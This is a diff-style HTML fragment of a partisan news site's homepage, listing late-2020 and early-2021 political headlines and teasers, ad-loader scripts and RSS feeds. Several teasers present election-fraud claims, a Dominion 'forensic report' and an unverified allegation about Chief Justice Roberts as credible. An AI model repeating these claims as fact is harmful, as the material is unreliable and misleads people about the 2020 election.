+<a href="https://madworldnews.com/kamala-harris-accused-plagiarism/" title="Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’">
+Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’ </a>
+</h2>
+</div>
+</div>
+</article>
+</li> <li class="mh-slider-item">
+<article class="post-326933 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-joe-biden tag-mitt-romney">
+<a href="https://madworldnews.com/airport-romney-trump-supporters/" title="Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him"><img alt="" class="attachment-mh-magazine-slider size-mh-magazine-slider wp-post-image" height="420" loading="lazy" sizes="(max-width: 800px) 100vw, 800px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330.jpg 800w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330-678x356.jpg 678w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330-550x289.jpg 550w" width="800"/> </a>
+<div class="mh-image-caption mh-slider-category">
+Political Opinion </div>
+<div class="mh-slider-caption">
+<div class="mh-slider-content">
+<h2 class="mh-slider-title">
+<a href="https://madworldnews.com/airport-romney-trump-supporters/" title="Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him">
+Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him </a>
+</h2>
+</div>
+</div>
+</article>
+</li> <li class="mh-slider-item">
+<article class="post-326912 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-joe-biden tag-mike-pence">
+<a href="https://madworldnews.com/founding-fathers-joe-biden/" title="‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare"><img alt="" class="attachment-mh-magazine-slider size-mh-magazine-slider wp-post-image" height="420" loading="lazy" sizes="(max-width: 800px) 100vw, 800px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470.jpg 800w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470-678x356.jpg 678w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470-550x289.jpg 550w" width="800"/> </a>
+<div class="mh-image-caption mh-slider-category">
+Political Opinion </div>
+<div class="mh-slider-caption">
+<div class="mh-slider-content">
+<h2 class="mh-slider-title">
+<a href="https://madworldnews.com/founding-fathers-joe-biden/" title="‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare">
+‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare </a>
+</h2>
+</div>
+</div>
+</article>
+</li> <li class="mh-slider-item">
+<article class="post-326904 post type-post status-publish format-standard has-post-thumbnail category-politics tag-joe-biden">
+<a href="https://madworldnews.com/defense-sec-biden-transition-team/" title="Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team"><img alt="" class="attachment-mh-magazine-slider size-mh-magazine-slider wp-post-image" height="420" loading="lazy" sizes="(max-width: 800px) 100vw, 800px" src="https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat.jpg 800w, https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat-678x356.jpg 678w, https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat-550x289.jpg 550w" width="800"/> </a>
+<div class="mh-image-caption mh-slider-category">
+Political Opinion </div>
+<div class="mh-slider-caption">
+<div class="mh-slider-content">
+<h2 class="mh-slider-title">
+<a href="https://madworldnews.com/defense-sec-biden-transition-team/" title="Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team">
+Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team </a>
+</h2>
+</div>
+</div>
+</article>
+</li> </ul>
+</div></div><div class="mh-widget mh-home-1 mh-home-wide widget_media_image" id="media_image-4"><img alt="" class="image wp-image-323153 attachment-medium size-medium" height="53" loading="lazy" sizes="(max-width: 678px) 100vw, 678px" src="https://madworldnews.com/wp-content/uploads/2020/07/Screen-Shot-2020-05-20-at-9.55.23-PM-678x53.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/07/Screen-Shot-2020-05-20-at-9.55.23-PM-678x53.jpg 678w, https://madworldnews.com/wp-content/uploads/2020/07/Screen-Shot-2020-05-20-at-9.55.23-PM-800x62.jpg 800w, https://madworldnews.com/wp-content/uploads/2020/07/Screen-Shot-2020-05-20-at-9.55.23-PM-550x43.jpg 550w, https://madworldnews.com/wp-content/uploads/2020/07/Screen-Shot-2020-05-20-at-9.55.23-PM.jpg 980w" style="max-width: 100%; height: auto;" width="678"/></div> <div class="mh-widget mh-home-7 mh-home-wide ai_widget" id="ai_widget-20"><div class="code-block code-block-14" style="margin: 8px 0; clear: both;">
+<div id="rcjsload_62b2c0"></div>
+<script type="text/javascript">
+(function() {
+var referer="";try{if(referer=document.referrer,"undefined"==typeof referer||""==referer)throw"undefined"}catch(exception){referer=document.location.href,(""==referer||"undefined"==typeof referer)&&(referer=document.URL)}referer=referer.substr(0,700);
+var rcds = document.getElementById("rcjsload_62b2c0");
+var rcel = document.createElement("script");
+rcel.id = 'rc_' + Math.floor(Math.random() * 1000);
+rcel.type = 'text/javascript';
+rcel.src = "https://trends.revcontent.com/serve.js.php?w=102810&t="+rcel.id+"&c="+(new Date()).getTime()+"&width="+(window.outerWidth || document.documentElement.clientWidth)+"&referer="+referer;
+rcel.async = true;
+rcds.appendChild(rcel);
+
+
+})();
+</script></div>
+</div><div class="mh-widget mh-home-7 mh-home-wide mh_magazine_custom_posts" id="mh_magazine_custom_posts-8"><h4 class="mh-widget-title"><span class="mh-widget-title-inner">Here’s The Latest</span></h4> <ul class="mh-custom-posts-widget clearfix"> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326957 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-mike-pence tag-police">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/revolution-trump-capitol-hill/" title="‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/revolution-trump-capitol-hill/" title="‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired">
+‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2021/01/">January 6, 2021</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Following the “Million Man MAGA Rally” held in Washington, D.C., the Electoral College count started on Capitol Hill. Vice-President Mike Pence issued a statement minutes before the certification process, and many say that it caused Trump supporters to storm Capitol Hill. Then, shots were fired inside the building. Don’t miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/revolution-trump-capitol-hill/" title="‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326945 post type-post status-publish format-standard has-post-thumbnail category-politics tag-joe-biden tag-kamala-harris">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/kamala-harris-accused-plagiarism/" title="Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/kamala-harris-accused-plagiarism/" title="Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’">
+Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’ </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2021/01/">January 6, 2021</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Kamala Harris is once again embroiled in a huge controversy. This time Joe Biden’s running mate is being accused of lying and plagiarizing Martin Luther King, Jr.’s own testimony about a little girl attending a freedom march in the 1960s. You don’t want to miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/kamala-harris-accused-plagiarism/" title="Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326933 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-joe-biden tag-mitt-romney">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/airport-romney-trump-supporters/" title="Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099519801330-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/airport-romney-trump-supporters/" title="Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him">
+Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2021/01/">January 6, 2021</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Utah Senator Mitt Romney was waiting for his flight to Washington, D.C. late Tuesday night when Trump supporters questioned his support of Joe Biden and desertion of his own party’s president, Donald Trump. Romney made the mistake of making excuses, and that’s when he got torched. Don’t miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/airport-romney-trump-supporters/" title="Showdown At Airport Doesn’t End Well For Romney: Trump Supporters Torch Him">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326912 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-joe-biden tag-mike-pence">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/founding-fathers-joe-biden/" title="‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16079715381470-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/founding-fathers-joe-biden/" title="‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare">
+‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 18, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>According to recent polls, many Americans believe the Democrats are trying to steal the election, and we can say “are trying” because of the brilliance of the framers of the Constitution. The constitutional process of electing the president is not over yet. You don’t want to miss how this could become the worst nightmare for Joe Biden and his supporters. <a class="mh-excerpt-more" href="https://madworldnews.com/founding-fathers-joe-biden/" title="‘Brilliant Move’ By Founding Fathers Could Become Joe Biden’s Worst Nightmare">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326904 post type-post status-publish format-standard has-post-thumbnail category-politics tag-joe-biden">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/defense-sec-biden-transition-team/" title="Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/11/biden-reporter-school-closings-feat-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/defense-sec-biden-transition-team/" title="Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team">
+Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 18, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Acting Defense Secretary Chris Miller reportedly ordered a halt to cooperation with the transition team of Joe Biden, resulting in canceled meetings building-wide. While the liberal press is attempting to downplay this development, Trump advisors are celebrating the move. You don’t want to miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/defense-sec-biden-transition-team/" title="Bombshell: Defense Secretary Orders Halt To Cooperation With Biden Transition Team">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326891 post type-post status-publish format-standard has-post-thumbnail category-politics tag-joe-biden tag-john-roberts">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/roberts-justices-texas-lawsuit/" title="Staffer Alleges Roberts Exploded While Talking To Other Justices Over Texas Lawsuit"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16083104997343-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16083104997343-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16083104997343-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/roberts-justices-texas-lawsuit/" title="Staffer Alleges Roberts Exploded While Talking To Other Justices Over Texas Lawsuit">
+Staffer Alleges Roberts Exploded While Talking To Other Justices Over Texas Lawsuit </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 18, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Texas State Elector Matt Patrick testified on Capitol Hill on Thursday making bombshell allegations against Chief Justice John Roberts. Patrick claimed a SCOTUS staffer’s damning testimony alleges Roberts’ “moral cowardice” lead to a massive fight in chambers over the Texas election lawsuit. Some are now calling for Roberts to step down immediately. Don’t miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/roberts-justices-texas-lawsuit/" title="Staffer Alleges Roberts Exploded While Talking To Other Justices Over Texas Lawsuit">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326881 post type-post status-publish format-standard has-post-thumbnail category-politics tag-barack-obama tag-donald-trump tag-hunter-biden tag-james-comey tag-joe-biden tag-kamala-harris tag-racism">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/special-counsel-hunter-biden/" title="Special Counsel Investigation Of Hunter Biden Could Be Democrats’ Dream Come True"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16081541094737-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16081541094737-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16081541094737-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/special-counsel-hunter-biden/" title="Special Counsel Investigation Of Hunter Biden Could Be Democrats’ Dream Come True">
+Special Counsel Investigation Of Hunter Biden Could Be Democrats’ Dream Come True </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 16, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>President Donald Trump is reported to be pushing for a Special Counsel to investigate Hunter Biden. This could lead to a much bigger crisis than we have witnessed in 2020 and be the Democrats’ dream come true. You don’t want to miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/special-counsel-hunter-biden/" title="Special Counsel Investigation Of Hunter Biden Could Be Democrats’ Dream Come True">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326873 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-joe-biden tag-melania-trump">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/general-insurrection-act-trump/" title="General Calls To Invoke ‘Insurrection Act’; Trump Advisor Makes Cryptic Facebook Post"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16075350903665-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16075350903665-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16075350903665-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/general-insurrection-act-trump/" title="General Calls To Invoke ‘Insurrection Act’; Trump Advisor Makes Cryptic Facebook Post">
+General Calls To Invoke ‘Insurrection Act’; Trump Advisor Makes Cryptic Facebook Post </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 16, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Retired Air Force Lt. Gen. Thomas McInerney is making it known he believes President Donald Trump has no choice but to invoke the Insurrection Act. That was echoed by a Republican state senator in North Carolina. Also, the White House Deputy Chief of Staff for Communications and Director of Social Media for the White House made a cryptic post on Facebook. Don’t miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/general-insurrection-act-trump/" title="General Calls To Invoke ‘Insurrection Act’; Trump Advisor Makes Cryptic Facebook Post">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326862 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-hillary-clinton tag-joe-biden tag-maxine-waters tag-mike-pence tag-nancy-pelosi">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/theory-trump-path-victory/" title="Democrats Freak Out, Theory For Trump’s ‘Paths To Victory’ Explained In Viral Video"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16081393632037-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16081393632037-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16081393632037-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/theory-trump-path-victory/" title="Democrats Freak Out, Theory For Trump’s ‘Paths To Victory’ Explained In Viral Video">
+Democrats Freak Out, Theory For Trump’s ‘Paths To Victory’ Explained In Viral Video </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 16, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Rep. Maxine Waters and Hillary Clinton are two of the Democrats who are freaking out after GOP electors voted for President Donald Trump. In fact, there’s a video going viral that theorizes “several paths to victory” available to President Trump. You don’t want to miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/theory-trump-path-victory/" title="Democrats Freak Out, Theory For Trump’s ‘Paths To Victory’ Explained In Viral Video">[…]</a></p>
+</div> </div>
+</div>
+</li> <li class="mh-custom-posts-item mh-custom-posts-large clearfix post-326850 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump">
+<div class="mh-custom-posts-large-inner clearfix">
+<figure class="mh-custom-posts-thumb-xl">
+<a class="mh-thumb-icon mh-thumb-icon-small-mobile" href="https://madworldnews.com/mi-election-dominion-forensic/" title="MI Election Officials Slam Dominion Forensic Report, Doesn’t End Well"><img alt="" class="attachment-mh-magazine-medium size-mh-magazine-medium wp-post-image" height="245" loading="lazy" sizes="(max-width: 326px) 100vw, 326px" src="https://madworldnews.com/wp-content/uploads/2020/12/composite_16080647398198-326x245.jpg" srcset="https://madworldnews.com/wp-content/uploads/2020/12/composite_16080647398198-326x245.jpg 326w, https://madworldnews.com/wp-content/uploads/2020/12/composite_16080647398198-80x60.jpg 80w" width="326"/> </a>
+</figure>
+<div class="mh-custom-posts-content">
+<div class="mh-custom-posts-header">
+<h3 class="mh-custom-posts-xl-title">
+<a href="https://madworldnews.com/mi-election-dominion-forensic/" title="MI Election Officials Slam Dominion Forensic Report, Doesn’t End Well">
+MI Election Officials Slam Dominion Forensic Report, Doesn’t End Well </a>
+</h3>
+<div class="mh-meta entry-meta">
+<span class="entry-meta-date updated"><i class="fa fa-clock-o"></i><a href="https://madworldnews.com/2020/12/">December 15, 2020</a></span>
+</div>
+</div>
+<div class="mh-excerpt"><p>Michigan election officials are slamming the forensic report on Dominion Voting Systems, the election technology used by Antrim County and elsewhere. However, this didn’t end well for those officials. Don’t miss this. <a class="mh-excerpt-more" href="https://madworldnews.com/mi-election-dominion-forensic/" title="MI Election Officials Slam Dominion Forensic Report, Doesn’t End Well">[…]</a></p>
+</div> </div>
+</div>
+</li> </ul></div><div class="mh-widget mh-home-7 mh-home-wide ai_widget" id="ai_widget-28"><div class="code-block code-block-13" style="margin: 8px 0; clear: both;">
+<div data-endpoint="//trends.revcontent.com" data-rc-widget="" data-widget-host="habitat" data-widget-id="243" id="rc-widget-f74619"></div>
+<script defer="defer" src="https://assets.revcontent.com/master/delivery.js" type="text/javascript"></script></div>
+</div> <div class="mh-home-columns clearfix">
+<div class="mh-widget-col-1 mh-sidebar mh-home-sidebar mh-home-area-8">
+<div class="mh-widget mh-home-8 widget_rss" id="rss-2"><h4 class="mh-widget-title"><span class="mh-widget-title-inner"><a class="rsswidget" href="http://feeds.feedburner.com/breitbart"><img alt="RSS" class="rss-widget-icon" height="14" src="https://madworldnews.com/wp-includes/images/rss.png" style="border:0" width="14"/></a> <a class="rsswidget" href="https://www.breitbart.com/">Breitbart</a></span></h4><ul><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/TM9hjj69l6A/">Eight Dead in 3 Shootings in Atlanta-Area Massage Parlors</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/8xVQaDBDCTI/">MSNBC's Joy Reid: Republicans Are 'Now the Dixiecrat Party'</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/teVplJUk7Is/">Harry Reid: Filibuster on Its Way Out -- 'Not a Question of If But When'</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/21wnULyOqmg/">Trump: COVID Vaccine Is 'a Great Vaccine, it's a Safe Vaccine,' and I 'Recommend It'</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/UOUOYYW1NVE/">Activists Pressure Biden to End Trump Campus Sexual Misconduct Rule</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/9XkMG6cn5H4/">White House: Joe Biden 'Open to Hearing Ideas' About Getting Rid of Filibuster Rule</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/00XkfY_LJ3k/">Democrats Block GOP Bill to Test Illegal Immigrants for Coronavirus</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/Y1znmJb4Y3s/">Candace Owens Slams Cardi B's 'Grotesque' Grammy Performance: 'You Are a Lost Soul'</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/8ndQSVjINY0/">Chuck Schumer Pushes Biden to Cancel $50K in Student Loan Debt</a></li><li><a class="rsswidget" href="http://feedproxy.google.com/~r/breitbart/~3/jeS1RQLVhks/">Poll: Working Class, Swing Voters Most Opposed to Amnesty for Illegal Aliens</a></li></ul></div> </div>
+<div class="mh-widget-col-1 mh-sidebar mh-home-sidebar mh-margin-left mh-home-area-9">
+<div class="mh-widget mh-home-9 widget_rss" id="rss-3"><h4 class="mh-widget-title"><span class="mh-widget-title-inner"><a class="rsswidget" href="http://feeds.foxnews.com/foxnews/politics"><img alt="RSS" class="rss-widget-icon" height="14" src="https://madworldnews.com/wp-includes/images/rss.png" style="border:0" width="14"/></a> <a class="rsswidget" href="http://www.foxnews.com/">Fox News</a></span></h4><ul><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/UrXo4R9HIPQ/salvadoran-president-tells-tucker-mass-immigration-not-profitable-feeding-on-dependency">Salvadoran president tells Tucker: Mass immigration 'not profitable,' 'feeding on dependency'</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/S_Uvk5bvsE0/migrant-children-in-us-custody-march">More than 13,000 migrant children in US custody: Reports</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/4eSCMKuXEYw/gavin-newsom-french-laundry-friend-banned-lobbying-administration-under-expanded-policy">Gavin Newsom's French Laundry friend banned from lobbying administration under expanded policy</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/IbTxYd1EUgw/virginia-governor-parole-board-northam-mcauliffe-cox">Virginia gubernatorial candidate Cox hits Northam, McAuliffe amid parole board whistleblower suit</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/JsQEyBSHL58/newsom-feinstein-comments-recall-threat">Newsom accused of suggesting he'd replace Feinstein with a Black person to save face amid recall threat</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/dt0G50ucSbo/biden-says-cuomo-should-resign-investigation">Biden says Cuomo should resign if the investigation confirms accusers' claims</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/gbOZwP3Ov_8/kamala-harris-avoid-commenting-cuomo">Kamala Harris continues to avoid commenting on Cuomo sexual misconduct allegations</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/sXyoO6SmgH4/donald-trump-hints-he-will-consider-running-for-president-again">Donald Trump hints he will consider running for president again</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/sowtBx8Ipek/vp-kamala-harris-migrant-children-border">VP Harris dodges question about migrant children: 'I haven't been briefed on anything today about 